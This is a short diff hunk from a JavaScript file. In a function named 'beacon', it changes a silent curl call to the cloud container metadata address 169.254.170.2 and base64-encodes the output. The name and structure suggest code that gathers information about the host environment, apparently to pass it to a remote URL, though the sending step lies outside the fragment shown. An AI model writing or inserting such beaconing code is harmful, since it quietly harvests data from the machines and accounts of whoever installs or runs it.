@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'curl -s "http://169.254.170.2/v3/task"',
+  'curl -s "http://169.254.170.2/v2/stats"',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
